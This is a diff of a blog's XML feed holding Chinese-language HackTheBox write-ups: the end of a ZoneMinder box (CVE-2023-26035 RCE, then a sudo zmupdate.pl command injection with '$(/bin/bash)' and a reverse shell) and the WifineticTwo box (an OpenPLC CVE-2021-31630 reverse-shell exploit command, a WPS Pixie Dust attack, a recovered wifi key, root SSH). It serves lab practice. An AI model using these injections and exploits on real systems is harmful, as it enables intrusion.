+<p>接著利用<code>CVE-2023-26035</code>的漏洞拿RCE<br><a href="https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py">https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py</a>  </p>
+<p><img src="https://hackmd.io/_uploads/HJzY_O-lA.png" alt="image"><br>在本地彈到使用者zoneminder的權限<br><img src="https://hackmd.io/_uploads/B1Kh_OZg0.png" alt="image">  </p>
+<p>這麼做的目的應該就是讓它可以合理操控zoneminder的相關perl腳本(?)  </p>
+<p><a href="https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/">https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/</a>  </p>
+<p>上網google找到這個command injection，照打：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version 1 --user=<span class="string">&#x27;$(/bin/bash)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/H1LbFO-gC.png" alt="image"><br>發現無法輸出，只好再串一個reverse shell出來(<br><img src="https://hackmd.io/_uploads/SyCXYdZg0.png" alt="image"><br>結束owob  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>今天晚上還會再打一台麻~<br>挑題easy的練手感(?)  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -2989,44 +3044,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
-    <title>WifineticTwo Write Up on HackTheBox</title>
-    <url>/2024/04/07/wifinetic2-htb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>不知道為什麼我的OneShot後來要重打進去之後就掛ㄌ…<br><del>反正絕對不是被我玩壞了</del>  </p>
-<p>Attacker’s IP : 10.10.14.46<br>Victim’s IP : 10.10.11.7  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.7 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-<p><strong>result:</strong>  </p>
-<p><img src="https://hackmd.io/_uploads/BJJOAXxgR.png" alt="image">  </p>
-<p>port 8080 開著 OepnPLC的服務：  </p>
-<p><img src="https://hackmd.io/_uploads/rktY0XgxR.png" alt="image">  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2021-31630"><a href="#CVE-2021-31630" class="headerlink" title="CVE-2021-31630"></a>CVE-2021-31630</h4><p>經過上網查詢得到預設密碼為 <code>openplc:openplc</code><br>在exploit-db上發現這個漏洞，從github抓取腳本：<br><a href="https://github.com/thewhiteh4t/cve-2021-31630/blob/main/cve_2021_31630.py">https://github.com/thewhiteh4t/cve-2021-31630/blob/main/cve_2021_31630.py</a><br>指令：<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 OpenPLCRCE.py -u openplc -p openplc -lh 10.10.14.46 -lp 9902 http://10.10.11.7:8080</span><br></pre></td></tr></table></figure>
-<p>在自己的9902 port開啟了reverse shell，get shell!!!<br><img src="https://hackmd.io/_uploads/SknSkVxgA.png" alt="image"><br>比較特別的是連上去已經是root+在一個容器裡面而且linpeas告訴我可以打出去，簡單了解後我嘗試了<code>CVE-2022-0492</code>的攻擊一個多小時都沒能成功&#x3D; &#x3D;<br>去喵了網路上的wp才知道要打wifi…  </p>
-<h4 id="wifi-hacking"><a href="#wifi-hacking" class="headerlink" title="wifi hacking"></a>wifi hacking</h4><p>可以參考這篇<br><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi">https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi</a>  </p>
-<p>然後我最後成功的oneshot版本，要先下載：<br><a href="https://github.com/kimocoder/OneShot/blob/master/oneshot.py">https://github.com/kimocoder/OneShot/blob/master/oneshot.py</a><br><strong>wifi scanning:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip <span class="built_in">link</span> show</span><br><span class="line">iw dev wlan0 scan</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/HkeTb4gxA.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/SJuybEegR.png" alt="image"><br>確認了<code>bss</code>是<code>02:00:00:00:01:00</code>, SSID是<code>plcrouter</code>，在對方機器上利用oneshot進行 WPS Pixie Dust attack：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/SkK0WNWeA.png" alt="image">  </p>
-<p>得到密碼(PSK)：NoWWEDoKnowWhaTisReal123!<br>接著把這些資訊存到config(在&#x2F;root)裡面：  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpa_passphrase plcrouter &#x27;NoWWEDoKnowWhaTisReal123!&#x27; &gt; config</span><br></pre></td></tr></table></figure>
-<p>最後用<code>wpa_supplicant</code>開啟wifi連線，並手動調整ip(要跟router在同一個內網)  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpa_supplicant -B -c config -i wlan0</span><br><span class="line">ifconfig wlan0 192.168.1.7 netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
-<p>再ssh上去就拿到flag啦~  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.1.1</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/BkBZXVxg0.png" alt="image">  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>超愛HTB的效果w<br>打wifi好好玩，可惜我把他玩壞了 :D  </p>
-<p><img src="https://hackmd.io/_uploads/Syjp27egC.png" alt="image">  </p>
-<p>第2048名超酷</p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>HackTheBox</tag>
-        <tag>Wifi</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Weasel on Tryhackme</title>
     <url>/2024/03/04/weasel/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>我想睡qqqq<br>🐳…<br>Victim’s IP : 10.10.254.66<br>Attacker’s IP : 10.9.195.189</p>
@@ -3070,6 +3087,44 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Windows</tag>
         <tag>Pentesting</tag>
         <tag>TryHackMe</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WifineticTwo Write Up on HackTheBox</title>
+    <url>/2024/04/07/wifinetic2-htb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>不知道為什麼我的OneShot後來要重打進去之後就掛ㄌ…<br><del>反正絕對不是被我玩壞了</del>  </p>
+<p>Attacker’s IP : 10.10.14.46<br>Victim’s IP : 10.10.11.7  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.7 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>result:</strong>  </p>
+<p><img src="https://hackmd.io/_uploads/BJJOAXxgR.png" alt="image">  </p>
+<p>port 8080 開著 OepnPLC的服務：  </p>
+<p><img src="https://hackmd.io/_uploads/rktY0XgxR.png" alt="image">  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2021-31630"><a href="#CVE-2021-31630" class="headerlink" title="CVE-2021-31630"></a>CVE-2021-31630</h4><p>經過上網查詢得到預設密碼為 <code>openplc:openplc</code><br>在exploit-db上發現這個漏洞，從github抓取腳本：<br><a href="https://github.com/thewhiteh4t/cve-2021-31630/blob/main/cve_2021_31630.py">https://github.com/thewhiteh4t/cve-2021-31630/blob/main/cve_2021_31630.py</a><br>指令：<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 OpenPLCRCE.py -u openplc -p openplc -lh 10.10.14.46 -lp 9902 http://10.10.11.7:8080</span><br></pre></td></tr></table></figure>
+<p>在自己的9902 port開啟了reverse shell，get shell!!!<br><img src="https://hackmd.io/_uploads/SknSkVxgA.png" alt="image"><br>比較特別的是連上去已經是root+在一個容器裡面而且linpeas告訴我可以打出去，簡單了解後我嘗試了<code>CVE-2022-0492</code>的攻擊一個多小時都沒能成功&#x3D; &#x3D;<br>去喵了網路上的wp才知道要打wifi…  </p>
+<h4 id="wifi-hacking"><a href="#wifi-hacking" class="headerlink" title="wifi hacking"></a>wifi hacking</h4><p>可以參考這篇<br><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi">https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi</a>  </p>
+<p>然後我最後成功的oneshot版本，要先下載：<br><a href="https://github.com/kimocoder/OneShot/blob/master/oneshot.py">https://github.com/kimocoder/OneShot/blob/master/oneshot.py</a><br><strong>wifi scanning:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip <span class="built_in">link</span> show</span><br><span class="line">iw dev wlan0 scan</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HkeTb4gxA.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/SJuybEegR.png" alt="image"><br>確認了<code>bss</code>是<code>02:00:00:00:01:00</code>, SSID是<code>plcrouter</code>，在對方機器上利用oneshot進行 WPS Pixie Dust attack：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/SkK0WNWeA.png" alt="image">  </p>
+<p>得到密碼(PSK)：NoWWEDoKnowWhaTisReal123!<br>接著把這些資訊存到config(在&#x2F;root)裡面：  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpa_passphrase plcrouter &#x27;NoWWEDoKnowWhaTisReal123!&#x27; &gt; config</span><br></pre></td></tr></table></figure>
+<p>最後用<code>wpa_supplicant</code>開啟wifi連線，並手動調整ip(要跟router在同一個內網)  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpa_supplicant -B -c config -i wlan0</span><br><span class="line">ifconfig wlan0 192.168.1.7 netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
+<p>再ssh上去就拿到flag啦~  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.1.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/BkBZXVxg0.png" alt="image">  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>超愛HTB的效果w<br>打wifi好好玩，可惜我把他玩壞了 :D  </p>
+<p><img src="https://hackmd.io/_uploads/Syjp27egC.png" alt="image">  </p>
+<p>第2048名超酷</p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
+        <tag>Wifi</tag>
       </tags>
   </entry>
   <entry>
